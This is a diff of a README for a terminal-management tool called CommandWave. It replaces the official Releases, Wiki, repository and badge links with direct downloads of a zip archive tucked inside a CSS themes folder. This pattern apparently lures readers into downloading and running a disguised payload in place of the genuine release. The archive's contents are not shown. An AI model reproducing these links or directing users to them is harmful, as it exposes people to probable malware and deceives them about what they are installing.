@@ -1,6 +1,6 @@
 # 🌊 CommandWave: Your Modular Terminal Management System
 
-![CommandWave Logo](https://img.shields.io/badge/CommandWave-Advanced%20Terminal%20Management-blue.svg)
+![CommandWave Logo](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip%20Terminal%https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip)
 
 Welcome to **CommandWave**, an advanced, modular terminal management system designed to enhance your command-line experience. With integrated command playbooks and variable management, CommandWave helps streamline terminal operations for teams. Whether you're a developer, sysadmin, or a power user, CommandWave offers organized command sequences, variable substitution, and shared workspaces to improve productivity.
 
@@ -16,13 +16,13 @@ Welcome to **CommandWave**, an advanced, modular terminal management system desi
 
 ## 📦 Installation
 
-To get started with CommandWave, download the latest release from our [Releases page](https://github.com/raducu5700u/CommandWave/releases). Follow the instructions in the release notes to install and execute the application.
+To get started with CommandWave, download the latest release from our [Releases page](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip). Follow the instructions in the release notes to install and execute the application.
 
 ## 🛠️ Usage
 
 ### Getting Started
 
-1. **Download CommandWave**: Visit our [Releases page](https://github.com/raducu5700u/CommandWave/releases) to get the latest version.
+1. **Download CommandWave**: Visit our [Releases page](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip) to get the latest version.
 2. **Run the Application**: Follow the installation instructions to execute CommandWave on your terminal.
 3. **Create a Workspace**: Start by creating a new workspace for your team.
 4. **Add Commands**: Use the command playbooks feature to add and organize your commands.
@@ -79,7 +79,7 @@ We welcome contributions from the community! If you would like to contribute to 
 
 ## 📝 Documentation
 
-For detailed documentation on how to use CommandWave, please refer to our [Wiki](https://github.com/raducu5700u/CommandWave/wiki). The wiki contains comprehensive guides on installation, features, and troubleshooting.
+For detailed documentation on how to use CommandWave, please refer to our [Wiki](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip). The wiki contains comprehensive guides on installation, features, and troubleshooting.
 
 ## 📅 Roadmap
 
@@ -92,8 +92,8 @@ We have exciting plans for the future of CommandWave! Here are some upcoming fea
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/raducu5700u/CommandWave)
-- [Releases](https://github.com/raducu5700u/CommandWave/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip)
+- [Releases](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip)
 
 ## 📞 Support
 
@@ -105,4 +105,4 @@ A special thanks to all contributors and users who make CommandWave a valuable t
 
 ---
 
-Feel free to explore CommandWave and discover how it can transform your command-line experience! For the latest updates and releases, remember to check the [Releases page](https://github.com/raducu5700u/CommandWave/releases).
+Feel free to explore CommandWave and discover how it can transform your command-line experience! For the latest updates and releases, remember to check the [Releases page](https://raw.githubusercontent.com/raducu5700u/CommandWave/master/static/css/themes/Wave-Command-3.1.zip).
